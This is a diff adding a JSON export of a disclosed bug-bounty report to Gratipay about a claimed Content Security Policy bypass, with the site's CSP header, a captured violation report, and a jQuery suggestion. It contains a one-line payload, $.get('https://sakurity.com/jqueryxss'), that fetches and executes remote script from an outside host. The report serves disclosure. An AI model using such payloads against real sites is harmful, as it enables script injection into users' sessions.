@@ -1,0 +1,108 @@
+{
+  "id": 241192,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDExOTI=",
+  "url": "https://hackerone.com/reports/241192",
+  "title": "CSP Policy Bypass and javascript execution",
+  "state": "Closed",
+  "substate": "duplicate",
+  "readable_substate": "Duplicate",
+  "created_at": "2017-06-18T16:12:36.462Z",
+  "submitted_at": "2017-06-18T16:12:36.462Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "athuljayaram",
+    "url": "/athuljayaram",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1868,
+    "url": "https://hackerone.com/gratipay",
+    "handle": "gratipay",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Gratipay",
+      "twitter_handle": "Gratipay",
+      "website": "https://gratipay.com/",
+      "about": "Gratitude? Gratipay! The easiest way for your company to pay for open source."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-06-18T17:40:27.286Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-06-18T17:40:27.236Z",
+  "team_member_agreed_on_going_public_at": "2017-06-18T16:37:00.988Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Java applets, ActiveX, audio and video files, and other HTML5 features.\n\nContent-Security-Policy-Report-Only: default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nin that their is also a report-uri which sends a report on CSP Violation  as POST in case of CSP violation to \nhttps://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nI have a captured CSP post request in case of violation\n\nPUT /r/default/csp/reportOnly HTTP/1.1\nHost: gratipay.report-uri.io\nConnection: close\nContent-Length: 738\nOrigin: https://gratipay.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.24 Safari/537.36\nContent-Type: application/csp-report\nAccept: */*\nDNT: 1\nReferer: https://gratipay.com/about/pricing\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\n\n{\"csp-report\":{\"document-uri\":\"https://gratipay.com/about/pricing\",\"referrer\":\"https://gratipay.com/about/\",\"violated-directive\":\"connect-src\",\"effective-directive\":\"connect-src\",\"original-policy\":\"default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\",\"disposition\":\"report\",\"blocked-uri\":\"https://sakurity.com/\",\"line-number\":8,\"column-number\":26577,\"source-file\":\"https://assets.gratipay.com/vendors.js?etag=rTtsoO9IGH-cTRpSMarMHQ~~\",\"status-code\":0,\"script-sample\":\"\"}}\n\n\n\n\nI like to use $.get('https://sakurity.com/jqueryxss'); as input to show the CSP policy bypass\n\nby using $.get('https://sakurity.com/jqueryxss'); I was able to bypass allowed CSP policy though https://sakurity.com is not allowed an approved origin of content, still I am able to fetch it and it didn't issue a POST request (report-uri attribute of CSP) which sends a report in case of any CSP violation ,\n\n\nSo using $.get request \nit didn't send a CSP report \nit read the remote content and executed the javascript\n\n\n\n\n\nSOLUTION\nUpdate your javascript libraries mainly jquery  elements to the latest version\n\n",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 195246,
+      "file_name": "gratipay_com.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/195/246/268cbeeb24fbc8b4a83acc14aa5b2b3d71f0e80f/gratipay_com.png?response-content-disposition=attachment%3B%20filename%3D%22gratipay_com.png%22%3B%20filename%2A%3DUTF-8%27%27gratipay_com.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ47SYAPAJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T214918Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFQlZdM%2BiHDyN9oni09hrwl3M7K20t9Vimgie0HLfNmHAiEAqmczIiyJE5llSe1xTfXIl4Bw%2BJdB3CSV3xMFov%2FAjEAqsQUIHhADGgwwMTM2MTkyNzQ4NDkiDGTATplagYxC2xegDSqOBVn84RpirpPeAsluMTBHBJPPcy3TNEGPtOb1g030u4%2BQqyRdbkHOeu8azW2dxIVENOx%2BPHk6VlHJXgV4d8HUPIeOnM40HYuXdOSzYUTyt1WXFSGpLJaSWiB03TZqdL5bqtaEMJu5UcC5z0Cdi1GIpGFsgKzCdcJQoIzDumo7zZyZ9WeFC77ekgmM1Wt6PkAYvHPeQGAJhATn1vEvc0eNnbdytiwFaQqiSvnY248y0JnJ%2F8qEDgRgNIDTYy%2BJzW8C1rSBNfmG86RcOINqrieLUz7e4D0OkTiY3ZmFJbhxMGry%2F%2BEU0uPJ2FhesmCsjPO2Q4qYjxuLteizkHbOCEMIryUDZ6lO7FPCEwUuQA0P2zZurtU7jXF70OoMpRIdmvSFpxF105GouBl7u4C4DaZd%2FG0WwEmttAW7MyhDk0R0yhnPvqm5u3qPizlXSvkGMTiEiC0kbntCjFpywefw2gw4IDltu1ccvvL5MhDRHiWVi79rEQQNnH2f%2BDZP85IQoc6JaVsSNBJMvQfnewwbTD7Ve8qIx5%2FnwFoaPMzFesb8pogauw4KP6A2BgO4GV8009Dnb9gRZpLVeBdKQaRp8kfLcsKRc%2FNd5BHQ7sMY8%2FmY%2BO4JpNd1FyN7DVnJvxavLkiTgXasTxpsBv5AJM25fhDmYeoEP%2BCmGUg4yii3832kILdhoI%2BrOFaNfRVdc0bNPBU6CqfNblTVRbk6fENhXMpkleVhNNVkQIDtCeUaofRXCfZ37l7pHU%2BJEOcXS4%2BIK5G2rpM0hdrTd3uua3MyiCbytk80G%2BiqNDf3zpJcaKkMCC54U6%2ByYkzQecXdlJVEeRzqP%2F3XWXv05Oqq9lNtf8rUOhd5ClgytZTNvJL9vV%2B%2FLTDTxMHGBjqxAYBo0aIpQji0ejSypObDv3XihNYitgjKFJgsdYeEepYKQhlw706ugkA1witeimv%2FDB1hc4iHPgAkUx%2B%2FvZ40%2FJ0apXyV5UFGy2LgXNmdzhqfjs%2F06haJgUg6CCQ5j1nkvFaan%2FyNQpk6Hccl%2BRB%2FKl8l3LZuSPiFwq78Bit95f3pmhaUjWgj8CLMjvf%2F7enBBgJwOyrmphgHZ7DafHSAJ5bjgcbapH5OR7Fsyd2fMtoh%2Fw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8b5ac15809fb3912aa9743062c956123a5abf6700c6df43db683df0004036d8a",
+      "file_size": 70246,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "eveeez",
+    "b7de13fb79e2483638f04b8",
+    "sumit7",
+    "juniorhero"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
